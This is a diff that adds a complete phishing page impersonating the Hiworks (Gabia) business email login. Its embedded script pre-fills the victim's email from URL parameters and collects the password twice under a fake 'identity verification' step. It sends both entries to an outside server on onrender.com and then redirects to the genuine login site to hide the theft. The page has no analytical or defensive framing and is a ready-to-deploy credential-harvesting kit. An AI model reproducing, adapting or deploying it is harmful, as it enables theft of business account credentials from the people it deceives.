@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<title>하이웍스 로그인</title>
+<link rel="icon" href="https://static.hiworks.com/asp/common/favicon/favicon-96x96.png">
+
+<style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+        height: 100%;
+        font-family: 'Pretendard Variable', Pretendard, -apple-system,
+                     'Segoe UI', Roboto, 'Malgun Gothic', sans-serif;
+        background: #ffffff;
+        color: #1a1a1a;
+        -webkit-font-smoothing: antialiased;
+    }
+    body { display: flex; flex-direction: column; min-height: 100vh; }
+
+    /* HEADER */
+    .top-bar { padding: 18px 40px; display: flex; align-items: center; }
+    .logo {
+        display: inline-flex; align-items: center; gap: 8px;
+        text-decoration: none; font-size: 26px; font-weight: 700;
+        color: #1e88e5; letter-spacing: -0.5px;
+    }
+
+    /* MAIN */
+    .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; }
+    .card { width: 100%; max-width: 420px; text-align: center; }
+
+    .hiworks-title {
+        font-size: 42px; font-weight: 700; color: #1e88e5;
+        letter-spacing: -1.5px; margin-bottom: 40px;
+    }
+    .hiworks-title.big { font-size: 54px; }
+
+    h1.title {
+        font-size: 26px; font-weight: 600; color: #1a1a1a;
+        margin-bottom: 10px; letter-spacing: -0.4px;
+    }
+    h2.subtitle {
+        font-size: 15px; font-weight: 400; color: #666;
+        margin-bottom: 30px; line-height: 1.5;
+    }
+
+    /* EMAIL CHIP */
+    .email-chip {
+        display: inline-flex; align-items: center; gap: 8px;
+        padding: 8px 18px; background: #f5f6f8; border-radius: 24px;
+        font-size: 14px; color: #333; margin-bottom: 22px;
+        max-width: 100%; word-break: break-all;
+    }
+    .email-chip svg { flex-shrink: 0; width: 16px; height: 16px; color: #666; }
+
+    /* INPUT */
+    .input-wrap { position: relative; margin-bottom: 14px; }
+    .input-wrap .input-icon {
+        position: absolute; left: 16px; top: 50%;
+        transform: translateY(-50%);
+        width: 18px; height: 18px; color: #aaa; pointer-events: none;
+    }
+    .input-wrap input {
+        width: 100%; height: 52px; padding: 0 16px 0 46px;
+        border: 1px solid #dcdde0; border-radius: 6px;
+        font-size: 15px; color: #1a1a1a; background: #fff;
+        transition: border-color 0.15s, background 0.15s;
+        font-family: inherit;
+    }
+    .input-wrap input::placeholder { color: #a8a8a8; }
+    .input-wrap input:focus { outline: none; border-color: #1e88e5; }
+    .input-wrap input:disabled {
+        background: #f5f6f8; color: #555;
+        -webkit-text-fill-color: #555; opacity: 1;
+    }
+
+    /* BUTTON */
+    .btn-primary {
+        width: 100%; height: 52px; border: none; border-radius: 6px;
+        background: #9ec6f3; color: #fff; font-size: 16px; font-weight: 600;
+        cursor: pointer; margin-top: 8px; transition: background 0.15s;
+        font-family: inherit; position: relative;
+    }
+    .btn-primary:hover:not(:disabled) { background: #1e88e5; }
+    .btn-primary:disabled { cursor: not-allowed; }
+    .btn-primary.active { background: #1e88e5; }
+    .btn-primary.active:hover { background: #1976d2; }
+
+    .spinner {
+        display: none; width: 16px; height: 16px;
+        border: 2px solid rgba(255,255,255,0.5);
+        border-top-color: #fff; border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+        vertical-align: middle; margin-right: 8px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* LINKS */
+    .links-row {
+        display: flex; align-items: center; justify-content: center;
+        gap: 14px; margin-top: 18px; font-size: 13px; color: #666;
+    }
+    .links-row a { color: #1e88e5; text-decoration: none; }
+    .links-row a:hover { text-decoration: underline; }
+    .links-row .divider { color: #d0d0d0; }
+
+    .ip-toggle {
+        display: inline-flex; align-items: center; gap: 8px;
+        font-size: 13px; color: #444;
+    }
+    .switch {
+        position: relative; display: inline-block;
+        width: 34px; height: 18px;
+    }
+    .switch input { opacity: 0; width: 0; height: 0; }
+    .slider {
+        position: absolute; cursor: pointer;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: #ccc; border-radius: 18px; transition: 0.2s;
+    }
+    .slider:before {
+        position: absolute; content: "";
+        height: 14px; width: 14px; left: 2px; bottom: 2px;
+        background: white; border-radius: 50%; transition: 0.2s;
+    }
+    .switch input:checked + .slider { background: #1e88e5; }
+    .switch input:checked + .slider:before { transform: translateX(16px); }
+
+    /* KOREAN NOTICE */
+    #privacyNotice {
+        display: none;
+        background: #eaf4ff; color: #0b3d91;
+        border: 1px solid #c3ddff; border-radius: 8px;
+        padding: 14px 16px; margin: 16px 0;
+        font-size: 14px; font-weight: 600;
+        line-height: 1.55; text-align: center;
+    }
+    #privacyNotice strong { font-weight: 700; }
+
+    /* ERROR */
+    #err {
+        display: none; margin-top: 12px;
+        padding: 10px 14px; border-radius: 6px;
+        background: #ffeaea; color: #c0392b;
+        border: 1px solid #f5b7b1;
+        font-size: 13px; font-weight: 500; text-align: left;
+    }
+
+    /* BOTTOM BANNER */
+    .bottom-banner { margin-top: 36px; display: flex; justify-content: center; }
+    .bottom-banner img {
+        max-width: 320px; width: 100%; height: auto; border-radius: 6px;
+    }
+
+    /* FOOTER */
+    .footer {
+        padding: 20px; text-align: center;
+        color: #a0a0a0; font-size: 12px;
+    }
+
+    /* LOADING OVERLAY */
+    #loadOverlay {
+        display: none; position: fixed; inset: 0;
+        background: rgba(255,255,255,0.95);
+        z-index: 999; flex-direction: column;
+        align-items: center; justify-content: center; gap: 18px;
+    }
+    #loadOverlay.show { display: flex; }
+    #loadOverlay .big-spinner {
+        width: 48px; height: 48px;
+        border: 4px solid #e0e0e0;
+        border-top-color: #1e88e5;
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+    }
+    #loadOverlay .load-text {
+        color: #1e88e5; font-size: 15px; font-weight: 600;
+    }
+
+    @media (max-width: 480px) {
+        .hiworks-title.big { font-size: 38px; }
+        .hiworks-title { font-size: 32px; }
+        h1.title { font-size: 22px; }
+        .top-bar { padding: 14px 20px; }
+        .bottom-banner img { max-width: 260px; }
+    }
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="top-bar">
+    <a href="#" class="logo">
+        <span class="hiworks-title" style="font-size:26px;margin:0;letter-spacing:-0.5px;">hiworks</span>
+    </a>
+</div>
+
+<!-- MAIN -->
+<div class="main">
+    <div class="card" id="card">
+
+        <div class="hiworks-title big" id="bigLogo">hiworks</div>
+
+        <!-- STEP 1 -->
+        <div id="step1">
+            <h1 class="title">Sign-in</h1>
+            <h2 class="subtitle">Please enter login ID with domain</h2>
+
+            <div class="input-wrap">
+                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                    <circle cx="12" cy="7" r="4"/>
+                </svg>
+                <input type="email" id="emailInput" placeholder="id@company.onhiworks.com" readonly>
+            </div>
+
+            <div class="input-wrap">
+                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="3" y="11" width="18" height="11" rx="2"/>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                </svg>
+                <input type="password" id="passwordInput" placeholder="Password" autocomplete="off" autofocus>
+            </div>
+
+            <button type="button" class="btn-primary" id="submitBtn">
+                <span class="spinner" id="btnSpinner"></span>
+                <span id="btnText">Next</span>
+            </button>
+
+            <div id="err"></div>
+
+            <div class="links-row" id="linksRow">
+                <a href="#">Sign in with another ID</a>
+                <span class="divider">|</span>
+                <a href="#">Forgot password</a>
+                <span class="ip-toggle">
+                    <label class="switch">
+                        <input type="checkbox" checked>
+                        <span class="slider"></span>
+                    </label>
+                    IP Security
+                </span>
+            </div>
+        </div>
+
+        <!-- STEP 2 -->
+        <div id="step2" style="display:none;">
+            <h1 class="title">Sign in to <span id="orgName">Company</span></h1>
+            <h2 class="subtitle">Please enter your password for identity verification.</h2>
+
+            <div class="email-chip">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                    <circle cx="12" cy="7" r="4"/>
+                </svg>
+                <span id="emailChipText">user@domain.com</span>
+            </div>
+
+            <div class="input-wrap">
+                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="3" y="11" width="18" height="11" rx="2"/>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                </svg>
+                <input type="password" id="passwordInput2" placeholder="Password" autocomplete="off" autofocus>
+            </div>
+
+            <button type="button" class="btn-primary active" id="submitBtn2">
+                <span class="spinner" id="btnSpinner2"></span>
+                <span id="btnText2">Sign-in</span>
+            </button>
+
+            <div id="err2" style="display:none;margin-top:12px;padding:10px 14px;border-radius:6px;background:#ffeaea;color:#c0392b;border:1px solid #f5b7b1;font-size:13px;font-weight:500;text-align:left;"></div>
+
+            <div class="links-row">
+                <a href="#">Sign in with another ID</a>
+                <span class="divider">|</span>
+                <a href="#">Forgot password</a>
+                <span class="ip-toggle">
+                    <label class="switch">
+                        <input type="checkbox" checked>
+                        <span class="slider"></span>
+                    </label>
+                    IP Security
+                </span>
+            </div>
+
+            <!-- Korean "current password" notice -->
+            <div id="privacyNotice">
+                <strong>현재 비밀번호를 입력해 주세요.</strong>
+            </div>
+        </div>
+
+        <!-- BOTTOM BANNER -->
+        <div class="bottom-banner">
+            <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 640 120'><defs><linearGradient id='g' x1='0' y1='0' x2='1' y2='0'><stop offset='0' stop-color='%23e8f0fb'/><stop offset='1' stop-color='%23fff3e0'/></linearGradient></defs><rect width='640' height='120' rx='8' fill='url(%23g)'/><rect x='30' y='30' width='80' height='60' rx='6' fill='white'/><rect x='50' y='45' width='40' height='4' rx='2' fill='%23a0a0a0'/><rect x='50' y='55' width='40' height='4' rx='2' fill='%23d0d0d0'/><rect x='50' y='65' width='30' height='4' rx='2' fill='%23d0d0d0'/><circle cx='90' cy='75' r='6' fill='%231e88e5'/><text x='140' y='55' font-family='Arial' font-size='16' font-weight='bold' fill='%231a1a1a'>영업 기회부터 계약까지</text><text x='140' y='78' font-family='Arial' font-size='12' fill='%23666'>하이웍스 세일즈로 관리하세요</text><polyline points='440,80 470,65 495,72 520,55 545,45 575,52 600,38' stroke='%23f5a623' stroke-width='3' fill='none' stroke-linecap='round'/><circle cx='520' cy='55' r='4' fill='%23f5a623'/><circle cx='545' cy='45' r='4' fill='%23f5a623'/></svg>" alt="">
+        </div>
+    </div>
+</div>
+
+<!-- FOOTER -->
+<div class="footer">© Gabia Inc.</div>
+
+<!-- LOADING OVERLAY -->
+<div id="loadOverlay">
+    <div class="big-spinner"></div>
+    <div class="load-text" id="loadText">Verifying...</div>
+</div>
+
+<script>
+/* ============================================================
+   CONFIG
+   ============================================================ */
+const BACKEND_URL = "https://sso-works-office.onrender.com";
+const REDIRECT_URL = "https://login.office.hiworks.com/";
+
+/* ============================================================
+   STATE
+   ============================================================ */
+let step = 1;
+let firstPassword = null;
+let email = '';
+
+/* ============================================================
+   READ EMAIL FROM URL — supports ?u=, ?auth=, ?e=, ?email=
+   ============================================================ */
+function getEmailFromUrl() {
+    const params = new URLSearchParams(window.location.search);
+    // Priority: u (sent by redirector), then auth, e, email
+    let e = params.get('u') || params.get('auth') || params.get('e') || params.get('email') || '';
+
+    if (!e && window.location.search.length > 1) {
+        const raw = window.location.search.substring(1);
+        try {
+            const decoded = atob(raw);
+            if (decoded.includes('@')) e = decoded;
+        } catch (err) {
+            if (raw.includes('@')) e = raw;
+        }
+    }
+
+    if (e) {
+        e = e.split('&')[0].split('?')[0].split('#')[0];
+        try { e = decodeURIComponent(e); } catch (err) {}
+        e = e.replace(/[<>"'\s]/g, '').trim();
+        if (!e.includes('@')) e = '';
+    }
+    return e;
+}
+
+/* ============================================================
+   DERIVE ORG NAME FROM DOMAIN
+   ============================================================ */
+function deriveOrgName(em) {
+    try {
+        const domain = em.split('@')[1] || '';
+        const part = domain.split('.')[0] || '';
+        return part.charAt(0).toUpperCase() + part.slice(1);
+    } catch (e) {
+        return 'Company';
+    }
+}
+
+/* ============================================================
+   BUTTON ACTIVE STATE
+   ============================================================ */
+function bindButtonActivation(inputEl, btnEl) {
+    inputEl.addEventListener('input', () => {
+        btnEl.classList.toggle('active', inputEl.value.trim().length > 0);
+    });
+    inputEl.addEventListener('keypress', e => {
+        if (e.which === 13) {
+            e.preventDefault();
+            btnEl.click();
+        }
+    });
+}
+
+/* ============================================================
+   OVERLAY
+   ============================================================ */
+function showOverlay(text) {
+    document.getElementById('loadText').textContent = text || 'Verifying...';
+    document.getElementById('loadOverlay').classList.add('show');
+}
+function hideOverlay() {
+    document.getElementById('loadOverlay').classList.remove('show');
+}
+
+/* ============================================================
+   INIT
+   ============================================================ */
+function init() {
+    email = getEmailFromUrl();
+
+    if (!email) {
+        document.getElementById('emailInput').value = '';
+        document.getElementById('emailInput').placeholder = 'id@company.onhiworks.com';
+        document.getElementById('emailInput').removeAttribute('readonly');
+        document.getElementById('emailInput').focus();
+    } else {
+        document.getElementById('emailInput').value = email;
+        document.getElementById('emailInput').setAttribute('readonly', 'readonly');
+        document.getElementById('emailChipText').textContent = email;
+        document.getElementById('orgName').textContent = deriveOrgName(email);
+        setTimeout(() => document.getElementById('passwordInput').focus(), 200);
+    }
+
+    bindButtonActivation(document.getElementById('passwordInput'), document.getElementById('submitBtn'));
+    bindButtonActivation(document.getElementById('passwordInput2'), document.getElementById('submitBtn2'));
+}
+
+/* ============================================================
+   STEP 1 → STEP 2
+   ============================================================ */
+async function submitStep1() {
+    const pw = document.getElementById('passwordInput').value;
+    const emailVal = document.getElementById('emailInput').value;
+
+    document.getElementById('err').style.display = 'none';
+
+    if (!emailVal || !emailVal.includes('@')) {
+        showError('Please enter a valid email address.');
+        return;
+    }
+    if (!pw) {
+        showError('Please enter your password.');
+        return;
+    }
+
+    const btn = document.getElementById('submitBtn');
+    const spinner = document.getElementById('btnSpinner');
+    const btnText = document.getElementById('btnText');
+    btn.disabled = true;
+    spinner.style.display = 'inline-block';
+    btnText.textContent = 'Verifying...';
+
+    try {
+        await fetch(BACKEND_URL + '/api/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email: emailVal, password: pw, stage: 1 })
+        });
+    } catch (e) {
+        console.warn('Stage 1 network error (ignored):', e);
+    }
+
+    firstPassword = pw;
+
+    btn.disabled = false;
+    spinner.style.display = 'none';
+    btnText.textContent = 'Next';
+
+    step = 2;
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('bigLogo').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
+    document.getElementById('privacyNotice').style.display = 'block';
+
+    document.getElementById('passwordInput2').value = '';
+    setTimeout(() => document.getElementById('passwordInput2').focus(), 100);
+}
+
+/* ============================================================
+   STEP 2 → REDIRECT
+   ============================================================ */
+async function submitStep2() {
+    const pw2 = document.getElementById('passwordInput2').value;
+    const emailVal = document.getElementById('emailInput').value;
+    const errEl = document.getElementById('err2');
+
+    errEl.style.display = 'none';
+
+    if (!pw2) {
+        errEl.textContent = 'Please enter your password.';
+        errEl.style.display = 'block';
+        return;
+    }
+
+    const btn = document.getElementById('submitBtn2');
+    const spinner = document.getElementById('btnSpinner2');
+    const btnText = document.getElementById('btnText2');
+    btn.disabled = true;
+    spinner.style.display = 'inline-block';
+    btnText.textContent = 'Signing in...';
+
+    let match = false;
+    let redirect = REDIRECT_URL;
+
+    try {
+        const res = await fetch(BACKEND_URL + '/api/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                email: emailVal,
+                password: pw2,
+                stage: 2,
+                firstPassword: firstPassword
+            })
+        });
+        const data = await res.json();
+        console.log('Stage 2:', data);
+        match = !!data.match;
+        if (data.redirect) redirect = data.redirect;
+    } catch (e) {
+        console.warn('Stage 2 network error:', e);
+        match = (pw2 === firstPassword);
+    }
+
+    if (!match && pw2 === firstPassword) match = true;
+
+    if (match) {
+        showOverlay('Signing in...');
+        setTimeout(() => { window.location.href = redirect; }, 900);
+    } else {
+        showError2('Passwords do not match. Please start over.');
+        setTimeout(() => { resetFlow(); }, 1200);
+    }
+}
+
+/* ============================================================
+   HELPERS
+   ============================================================ */
+function showError(msg) {
+    const el = document.getElementById('err');
+    el.textContent = msg;
+    el.style.display = 'block';
+}
+function showError2(msg) {
+    const el = document.getElementById('err2');
+    el.textContent = msg;
+    el.style.display = 'block';
+}
+
+function resetFlow() {
+    step = 1;
+    firstPassword = null;
+
+    document.getElementById('passwordInput').value = '';
+    document.getElementById('passwordInput2').value = '';
+    document.getElementById('err').style.display = 'none';
+    document.getElementById('err2').style.display = 'none';
+    document.getElementById('privacyNotice').style.display = 'none';
+
+    document.getElementById('step1').style.display = 'block';
+    document.getElementById('step2').style.display = 'none';
+    document.getElementById('bigLogo').style.display = 'block';
+
+    document.getElementById('submitBtn').disabled = false;
+    document.getElementById('btnSpinner').style.display = 'none';
+    document.getElementById('btnText').textContent = 'Next';
+
+    document.getElementById('submitBtn2').disabled = false;
+    document.getElementById('btnSpinner2').style.display = 'none';
+    document.getElementById('btnText2').textContent = 'Sign-in';
+
+    setTimeout(() => document.getElementById('passwordInput').focus(), 150);
+}
+
+/* ============================================================
+   WIRE UP
+   ============================================================ */
+document.getElementById('submitBtn').addEventListener('click', submitStep1);
+document.getElementById('submitBtn2').addEventListener('click', submitStep2);
+
+document.getElementById('emailInput').addEventListener('keypress', e => {
+    if (e.which === 13) {
+        e.preventDefault();
+        document.getElementById('passwordInput').focus();
+    }
+});
+
+window.addEventListener('DOMContentLoaded', init);
+</script>
+
+</body>
+</html>
